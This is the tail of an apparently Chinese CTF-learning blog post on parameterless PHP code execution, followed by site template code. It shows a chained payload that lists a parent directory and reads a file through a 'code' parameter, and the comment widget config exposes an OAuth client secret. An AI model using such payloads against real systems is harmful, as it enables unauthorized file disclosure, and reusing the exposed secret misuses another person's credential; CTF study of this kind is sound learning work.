+scandir(dirname(chdir(dirname(getcwd()))))  //获取目录/var/www的所有文件，返回值为一维数组前两个值为'.'和'..'
+array_reverse(scandir(dirname(chdir(dirname(getcwd())))))  //翻转上述的一维数组，将'.'和'..'移到后面
+current(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))) //获取数组第一个值。
+readfile(current(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))) //读文件/var/www/xxx.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>payload:</p>
+<pre class="line-numbers language-html"><code class="language-html">?code=readfile(pos(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://s2.ax1x.com/2019/11/05/M9yjoj.png" alt="M9yjoj.png"><br>理清思路：<br>getcwd() 获取当前目录<br>scandir() 列目录<br>dirname() 目录上跳</p>
+<p>总结读文件的函数：</p>
+<pre class="line-numbers language-html"><code class="language-html">file() //把整个文件读入一个数组中
+file_get_contents()以字符串形式获取文件的内容。
+readfile()输出文件
+
+不能使用
+fopen()+fread()  //按字节读取
+fopen()+fgets() //按行读取
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>数组取值：</p>
+<pre class="line-numbers language-html"><code class="language-html">next() //返回数组中的下个单元
+prev() //返回数组的上一个单元
+pos()和current() //返回数组中的当前单元
+end()//返回数组中的最后单元
+each() 返回数组中当前的键／值对并将数组指针向前移动一步
+reset()将数组的内部指针指向第一个单元
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例子：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+$transport = array('foot', 'bike', 'car', 'plane');
+$mode = current($transport); // $mode = 'foot';
+$mode = next($transport);    // $mode = 'bike';
+$mode = next($transport);    // $mode = 'car';
+$mode = prev($transport);    // $mode = 'bike';
+$mode = end($transport);     // $mode = 'plane';
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>无参数RCE的例题：<br><a href="https://www.anquanke.com/post/id/186187#h3-1" target="_blank" rel="noopener">ByteCTF 2019-boring_code</a><br>这个有一些姿势可以学习：参见writeup<a href="https://xz.aliyun.com/t/6324" target="_blank" rel="noopener">ByteCTF 2019 Writeup</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>姿势还有很多，继续努力。</p>
+<p>本文借鉴多篇大佬文章：<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a><br><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">PHP-Parametric-Function-RCE</a></p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/images/post-cover/32.jpg"></div>
+
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+			<a href="/2019/11/08/thinkphp基础学习/" title="thinkphp5基础学习" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
+
+<div class="relate-post">
+	<ul>
+		
+				<li>
+					<div>
+						<a href="/2019/11/20/bypass-disfunction/" title="bypass disfunction">
+							bypass disfunction
+						</a>
+						<p>
+							前言PHP 的 disabled_functions主要是用于禁用一些危险的函数防止攻击者执行系统命令。但是有一些绕过方法。这里做个总结。
+基本思路有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在...
+						</p>
+					</div>
+
+					<a href="/2019/11/20/bypass-disfunction/" title="bypass disfunction">				
+						<img src="/images/post-cover/24.jpg" class="relateImg" alt="bypass disfunction">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">
+							php代码审计之文件包含
+						</a>
+						<p>
+							文件包含文件包含分为本地文件包含（Local File Inclusion，简LFI)和远程文件包含（Remote File Inclusion，简RFI）。
+在php中常见的文件包含函数有：
+include()
+include_on...
+						</p>
+					</div>
+
+					<a href="/2019/06/11/php代码审计之文件包含/" title="php代码审计之文件包含">				
+						<img src="/images/post-cover/37.jpg" class="relateImg" alt="php代码审计之文件包含">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/05/28/文件上传漏洞/" title="文件上传漏洞">
+							文件上传漏洞
+						</a>
+						<p>
+							前言我是根据upload-lab来总结文件上传漏洞。思维导图：
+pass-01提示：在客户端使用js对不合法图片进行检查！所以我们可以通过抓包，改包就可以绕过。。。
+pass-02提示：服务端对数据包的MIME进行检查！
+这里是对Co...
+						</p>
+					</div>
+
+					<a href="/2019/05/28/文件上传漏洞/" title="文件上传漏洞">				
+						<img src="/images/post-cover/35.jpg" class="relateImg" alt="文件上传漏洞">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/04/25/sql注入知识总结/" title="sql注入知识总结">
+							sql注入知识总结
+						</a>
+						<p>
+							前言最近，感觉知识学的有点混乱，来整理一波自己的知识。先总结一下sql注入吧。
+知识储备sql注入中常用到的库和表information_schema库
+
+这个数据库中保存着mysql服务器所保存的所有的其他数就库的信息，如数据库名，...
+						</p>
+					</div>
+
+					<a href="/2019/04/25/sql注入知识总结/" title="sql注入知识总结">				
+						<img src="/images/post-cover/26.jpg" class="relateImg" alt="sql注入知识总结">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2018/10/09/linux基本操作/" title="linux基本操作">
+							linux基本操作
+						</a>
+						<p>
+							centos常用命令及快捷键整理常用linux命令文件和目录cd /home                        进入 '/home' 目录
+cd ..                                返回上一...
+						</p>
+					</div>
+
+					<a href="/2018/10/09/linux基本操作/" title="linux基本操作">				
+						<img src="/images/post-cover/30.jpg" class="relateImg" alt="linux基本操作">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2018/10/08/linux查看系统信息/" title="linux查看系统信息">
+							linux查看系统信息
+						</a>
+						<p>
+							linux系统下经常查看各种信息，总结一下。
+系统uname -a               # 查看内核/操作系统/CPU信息
+head -n 1 /etc/issue   # 查看操作系统版本
+cat /etc/issue | ...
+						</p>
+					</div>
+
+					<a href="/2018/10/08/linux查看系统信息/" title="linux查看系统信息">				
+						<img src="/images/post-cover/29.jpg" class="relateImg" alt="linux查看系统信息">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">
+							2019极客大挑战RCE ME
+						</a>
+						<p>
+							题目环境：http://114.116.44.23:40001/
+题目还是老样子。无字母数字rce。知识点其实都有写过，就不说了。详细参见：【RCE提高篇】题目源码：
+&lt;?php
+ini_set("display_errors"...
+						</p>
+					</div>
+
+					<a href="/2019/11/20/2019极客大挑战RCE-ME/" title="2019极客大挑战RCE ME">				
+						<img src="/images/post-cover/32.jpg" class="relateImg" alt="2019极客大挑战RCE ME">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/11/08/thinkphp基础学习/" title="thinkphp5基础学习">
+							thinkphp5基础学习
+						</a>
+						<p>
+							thinkphp5基础认识在thinkphp5中，无论我们怎么对项目进行更改，最终我们访问的文件只有一个，我们把这种只需要通过访问一个（单个）文件就能实现各种功能需求的设计，叫做『单入口模式』。
+在thinkphp中，是通过“入口文件...
+						</p>
+					</div>
+
+					<a href="/2019/11/08/thinkphp基础学习/" title="thinkphp5基础学习">				
+						<img src="/images/post-cover/6.jpg" class="relateImg" alt="thinkphp5基础学习">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">
+							buuctf刷题记录(序)
+						</a>
+						<p>
+							love math知识点：代码审计，绕waf直接给出源码：
+&lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    sho...
+						</p>
+					</div>
+
+					<a href="/2019/10/16/buuctf刷题记录-序/" title="buuctf刷题记录(序)">				
+						<img src="/images/post-cover/33.jpg" class="relateImg" alt="buuctf刷题记录(序)">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/10/11/phar拓展反序列化攻击面/" title="phar拓展反序列化攻击面">
+							phar拓展反序列化攻击面
+						</a>
+						<p>
+							pharphar扩展提供了一种将整个php应用程序放入名为“phar”（php archive）的单个文件中的方法，以便于分发和安装。除了提供这个服务之外，phar扩展还提供了一个文件格式抽象方法，用于通过phardata类创建和操作...
+						</p>
+					</div>
+
+					<a href="/2019/10/11/phar拓展反序列化攻击面/" title="phar拓展反序列化攻击面">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="phar拓展反序列化攻击面">
+					</a>
+				</li>											
+		
+		
+	</ul>
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//Thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//Remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//Create gitalk
+	var gitalk = new Gitalk({
+		clientID: 'b7a5e9f0853539dc3363',
+		clientSecret: '3cd61bd5dfe5ddffe1c91e4392ca95874aade540',
+		//id: window.location.pathname,
+		//id: decodeURI(window.location.pathname),
+		//id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+		repo: 'blog-Comment-Repo',
+		owner: 'ab-Alex',
+		admin: 'ab-Alex',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+
+		
+		
+	
+
+</div>
+			</div>
+		</div>	
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+
+	<script>
+		var appid = 'dXz',
+            appkey = 'wzG';	  
+        AnnieLeancloud(appid, appkey);         
+	</script>
+    
+
+
+ 
+
+<!-- show math formula -->
+
+	<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	<script type="text/x-mathjax-config">
+		MathJax.Hub.Config(
+			{ 
+				tex2jax: {
+					inlineMath: [['$','$'], ['\\(','\\)']]
+				} 
+			}
+		);
+	</script>
+
+
+
+<script>
+	//Refer to https://xinyo.org/archives/66226, thanks xinyo!
+	function codeCopy() {
+		var copyContainerId = 'copy-nav';
+						
+		$("pre").before(" <nav class=' " + copyContainerId + " '><i class='code-language'></i></nav> ");
+		
+		$('.' + copyContainerId).append("<i class='fa fa-clipboard copy-btn' aria-hidden='true'></i>");
+		
+		$('#article-content').find('pre').each( function () {
+			var language = $(this).children('code').attr('class').substr(9);//why 9? Need to check language?
+			$(this).prev().find('.code-language').text( language );	
+		});
+				
+		//为复制按钮添加click事件
+		$('.copy-btn').on("click", function() {
+			//初始化
+			$("textarea").remove("#targetId");
+			
+			//获取对应的代码
+			var codePre = $(this).parent().next(),
+				codeText = codePre[0].textContent,
+				target = document.createElement("textarea");
+			target.style.position = "absolute";
+			target.style.left = "-9999px";
+			target.style.top = "0";
+			target.id = "targetId";
+			codePre.append(target);
+			target.textContent = codeText;
+
+			//选中textarea内的代码
+			target.focus();
+			target.setSelectionRange(0, target.value.length);
+
+			// 复制选中的内容
+			document.execCommand("copy");
+			
+			//删除添加的节点
+			$("textarea").remove("#targetId");
+			
+			var thisCopied = $(this);
+			thisCopied.addClass('copy-status');	
+			setTimeout( function() {
+				thisCopied.removeClass('copy-status');
+			}, 2000)
+		});	
+	}
+	
+	if( $('.layout-post').length )	{
+		codeCopy();
+	}
+</script>
+
+
+<!-- TODO: There seems to be a bug when you close the post gallery! -->
+<link rel="stylesheet" href="/plugin/lightgallery/css/lightgallery.css">
+<script src="/plugin/lightgallery/js/jquery-1.11.0.min.js"></script>
+<script src="/plugin/lightgallery/js/lightgallery-all.min.js"></script>
+
+<script type="text/javascript">
+	var postTitle = $('.article-title a').text() ? $('.article-title a').text() : "No post title!";
+	$('.article-content img').each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		$(this).wrap('<div class="img-responsive" data-src="' + imgPath + '" data-responsive="' + imgPath + '" data-sub-html="<p>图片 ' + imgTitle + '</p><h4>文章' + postTitle + '</h4>"></div>');
+	});
+
+	$('.article-content').lightGallery({
+		mode: 'lg-slide',
+		selector: '.img-responsive',
+		share: false,
+		zoom: false,
+		download: false
+	});
+	//TODO：支持video
+</script>
+
+<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+		
+
+		<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+		
+	<div class="copyright">
+		<p>
+			 
+				&copy;2017 - 2019, content by Alex. All Rights Reserved.
+			
+			
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+		</p>
+		<p>
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay. 					
+		</p>
+	</div>		
+</footer>
+		
+    <!-- set '1' to show motto in all pages! -->
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html( getMingYanContent() );
+	</script>	
+
+
+
+
+    <!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup">
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      ESC
+   </span>
+		<div class="local-search-header">
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			
+
+   
+	<div id="topN"></div>
+	
+    <script>
+        var appid = 'dXz',
+            appkey = 'wzG',
+            limitCount = 10;
+        if( $('#topN').length ){
+            AV.initialize(appid, appkey);
+            var Counter = AV.Object.extend("Counter");  
+            topNPost(Counter, limitCount);
+        }
+    </script>
+   
+
+		</div>
+	</div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+    <script src="/js/love.js"></script>
+
+
+<!--back to top-->
+
+    
+	<div id="totop">
+  		<a href="javascript:;"  name="TOTOP" class="fa fa-arrow-up" ></a>
+	</div>
+	<div id="tobuttom">
+		<a href="javascript:;"  name="TOBUTTOM" class="fa fa-arrow-down" ></a>
+	</div>
+ 
+
+
+ 
+
+<script src="/js/vibrant.js"></script>
+<script src="/js/chinese.js"></script>
+<script src="/js/main.js"></script>
+	</body>
+	</html>
